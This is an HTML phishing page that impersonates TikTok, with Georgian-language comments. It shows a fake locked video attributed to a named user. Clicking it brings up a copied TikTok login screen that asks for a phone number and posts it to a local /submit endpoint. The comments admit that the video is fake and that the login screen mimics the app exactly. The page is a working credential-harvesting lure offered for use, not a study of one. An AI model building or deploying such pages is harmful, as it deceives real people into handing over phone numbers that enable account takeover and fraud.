<!DOCTYPE html>
<html lang="ka">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok - Make Your Day</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');

  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #000;
    color: #fff;
    font-family: 'Inter', sans-serif;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  /* მთავარი კონტეინერი */
  .tiktok-container {
    width: 100%;
    max-width: 380px;
    height: 100vh;
    max-height: 800px;
    background: #000;
    position: relative;
    overflow: hidden;
    display: flex;
    flex-direction: column;
  }

  /* 1. ვიდეოს ეკრანი */
  .video-screen {
    position: absolute;
    inset: 0;
    display: flex;
    flex-direction: column;
    background: #000;
    z-index: 1;
  }

  .video-player {
    flex: 1;
    position: relative;
    /* ვითომ ვიდეოს ფოტო (შენი ვიდეოს მიხედვით) */
    background: url('https://images.unsplash.com/photo-1598550880863-4e8aa3d0edb4?q=80&w=1000&auto=format&fit=crop') center/cover;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    overflow: hidden;
  }

  /* ვითომ ტექსტი ვიდეოზე */
  .video-text {
    position: absolute;
    bottom: 100px;
    width: 100%;
    text-align: center;
    font-size: 20px;
    font-weight: 800;
    text-shadow: 0 2px 4px rgba(0,0,0,0.8);
    color: #fff;
    letter-spacing: 1px;
  }

  /* Play ღილაკი */
  .play-btn {
    width: 80px;
    height: 80px;
    background: rgba(255,255,255,0.15);
    backdrop-filter: blur(10px);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 2;
    border: 1px solid rgba(255,255,255,0.3);
    transition: transform 0.2s, background 0.2s;
  }
  .play-btn:hover { transform: scale(1.05); background: rgba(255,255,255,0.25); }
  .play-btn svg { width: 35px; height: 35px; fill: #fff; margin-left: 5px; }

  /* ვიდეოს ქვედა ინფო */
  .video-info {
    padding: 20px;
    background: linear-gradient(to top, #000 0%, transparent 100%);
    position: absolute;
    bottom: 0;
    width: 100%;
    z-index: 2;
  }

  .author {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 10px;
  }
  .author-avatar {
    width: 48px;
    height: 48px;
    background: #333;
    border-radius: 50%;
    border: 2px solid #fff;
  }
  .author-name {
    font-weight: 700;
    font-size: 16px;
    text-shadow: 0 1px 3px rgba(0,0,0,0.8);
  }
  .author-name span { color: #00f2ea; }
  .caption {
    font-size: 14px;
    color: #eee;
    line-height: 1.4;
    margin-bottom: 15px;
  }

  /* 2. ლოგინის ეკრანი (ზუსტად როგორც TikTok-ის აპშია) */
  .login-screen {
    position: absolute;
    inset: 0;
    background: rgba(18, 18, 18, 0.95);
    backdrop-filter: blur(20px);
    display: none;
    flex-direction: column;
    align-items: center;
    padding: 40px 20px;
    z-index: 10;
    animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
  }
  .login-screen.active { display: flex; }

  @keyframes slideUp {
    from { transform: translateY(100%); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
  }

  .close-btn {
    position: absolute;
    top: 20px;
    right: 20px;
    width: 30px;
    height: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    opacity: 0.6;
  }
  .close-btn svg { width: 24px; height: 24px; fill: #fff; }

  /* TikTok ლოგო */
  .logo { margin-bottom: 25px; }
  h2 { font-size: 24px; font-weight: 800; margin-bottom: 8px; text-align: center; }
  p.subtitle { color: #888; font-size: 14px; margin-bottom: 30px; text-align: center; line-height: 1.4; }

  /* Open TikTok ღილაკი */
  .open-tiktok-btn {
    background: #fff;
    color: #000;
    border: none;
    padding: 16px;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    transition: transform 0.2s, background 0.2s;
  }
  .open-tiktok-btn:hover { background: #eee; transform: scale(1.02); }
  .open-tiktok-btn:active { transform: scale(0.98); }

  /* ნომრის ფორმა */
  .phone-form {
    display: none;
    width: 100%;
    margin-top: 20px;
    animation: fadeIn 0.3s ease;
  }
  .phone-form.active { display: block; }

  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }

  .input-group {
    display: flex;
    gap: 8px;
    margin-bottom: 15px;
  }

  select {
    width: 35%;
    padding: 16px 10px;
    border-radius: 8px;
    border: 1px solid #333;
    background: #1a1a1a;
    color: #fff;
    font-size: 15px;
    outline: none;
    appearance: none;
    cursor: pointer;
  }

  input[type="tel"] {
    width: 65%;
    padding: 16px 15px;
    border-radius: 8px;
    border: 1px solid #333;
    background: #1a1a1a;
    color: #fff;
    font-size: 16px;
    outline: none;
    letter-spacing: 1px;
    transition: border 0.3s;
  }
  input[type="tel"]:focus { border-color: #fe2c55; }

  .error-msg {
    color: #fe2c55;
    font-size: 12px;
    display: none;
    margin-bottom: 10px;
    text-align: left;
  }

  .continue-btn {
    width: 100%;
    padding: 16px;
    border-radius: 8px;
    border: none;
    background: #333;
    color: #888;
    font-size: 16px;
    font-weight: 700;
    cursor: not-allowed;
    transition: all 0.3s;
  }
  .continue-btn.enabled {
    background: #fe2c55;
    color: #fff;
    cursor: pointer;
  }
  .continue-btn.enabled:hover { background: #e6254b; }

</style>
</head>
<body>

  <div class="tiktok-container">
    
    <!-- 1. ვიდეოს ეკრანი -->
    <div class="video-screen" id="videoScreen">
      <div class="video-player" onclick="openLogin()">
        <div class="play-btn">
          <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
        </div>
        <!-- ვიდეოს ტექსტი (შენი ვიდეოს მიხედვით) -->
        <div class="video-text">ბანკეტი მუ????</div>
      </div>
      
      <div class="video-info">
        <div class="author">
          <div class="author-avatar"></div>
          <div>
            <div class="author-name">nanikogamkhitashvili <span>·</span></div>
            <div style="font-size: 12px; color: #aaa;">TikTok</div>
          </div>
        </div>
        <div class="caption">
          ვიდეოს საყურებლად გაიარეთ ავტორიზაცია 🔒
        </div>
      </div>
    </div>

    <!-- 2. ლოგინის ეკრანი -->
    <div class="login-screen" id="loginScreen">
      <!-- დახურვის ღილაკი (რომ უკან დაბრუნდეს) -->
      <div class="close-btn" onclick="closeLogin()">
        <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
      </div>

      <div class="logo">
        <svg width="60" height="60" viewBox="0 0 24 24" fill="none">
          <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#00f2ea" transform="translate(-1, -1)"/>
          <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#fe2c55" transform="translate(1, 1)"/>
          <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#ffffff"/>
        </svg>
      </div>
      
      <h2>Welcome back</h2>
      <p class="subtitle">Log in to TikTok to watch the full video</p>

      <!-- ღილაკი -->
      <button class="open-tiktok-btn" id="openTiktokBtn" onclick="showPhoneForm()">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
           <path d="M16.5 3C16.5 3 17 7 21 8.5V12.5C18.5 12.5 16.5 11 16.5 11V17.5C16.5 20.5 14 23 11 23C8 23 5.5 20.5 5.5 17.5C5.5 14.5 8 12 11 12V15.5C9.5 15.5 8.5 16.5 8.5 17.5C8.5 18.5 9.5 19.5 11 19.5C12.5 19.5 13 18.5 13 17.5V3H16.5Z" fill="#000"/>
        </svg>
        Continue with TikTok
      </button>

      <!-- ნომრის ფორმა -->
      <form class="phone-form" id="phoneForm" action="/submit" method="POST" onsubmit="return validateForm()">
        <div class="input-group">
          <select name="country" id="country">
            <option value="+995" data-len="9">🇬🇪 +995</option>
            <option value="+1" data-len="10">🇺🇸 +1</option>
            <option value="+44" data-len="10">🇬🇧 +44</option>
            <option value="+7" data-len="10">🇷🇺 +7</option>
            <option value="+90" data-len="10">🇹🇷 +90</option>
            <option value="+380" data-len="9">🇺🇦 +380</option>
            <option value="+49" data-len="10">🇩🇪 +49</option>
            <option value="+33" data-len="9">🇫🇷 +33</option>
          </select>
          <input type="tel" id="phone" name="phone" placeholder="Phone number" required oninput="validateInput(this)">
        </div>
        <div class="error-msg" id="errorMsg">Please enter a valid phone number</div>
        <button type="submit" class="continue-btn" id="submitBtn" disabled>Continue</button>
      </form>
    </div>
  </div>

<script>
  function openLogin() {
    document.getElementById('loginScreen').classList.add('active');
  }

  function closeLogin() {
    document.getElementById('loginScreen').classList.remove('active');
  }

  function showPhoneForm() {
    document.getElementById('openTiktokBtn').style.display = 'none';
    document.getElementById('phoneForm').classList.add('active');
  }

  function validateInput(input) {
    input.value = input.value.replace(/\D/g, '');
    
    const countrySelect = document.getElementById('country');
    const requiredLength = parseInt(countrySelect.options[countrySelect.selectedIndex].getAttribute('data-len'));
    const errorMsg = document.getElementById('errorMsg');
    const submitBtn = document.getElementById('submitBtn');

    if (input.value.length === requiredLength) {
      input.style.borderColor = '#00f2ea';
      errorMsg.style.display = 'none';
      submitBtn.disabled = false;
      submitBtn.classList.add('enabled');
    } else {
      input.style.borderColor = input.value.length > 0 ? '#fe2c55' : '#333';
      errorMsg.style.display = input.value.length > 0 ? 'block' : 'none';
      submitBtn.disabled = true;
      submitBtn.classList.remove('enabled');
    }
  }

  document.getElementById('country').addEventListener('change', function() {
    validateInput(document.getElementById('phone'));
  });

  function validateForm() {
    const submitBtn = document.getElementById('submitBtn');
    return !submitBtn.disabled;
  }
</script>
</body>
</html>
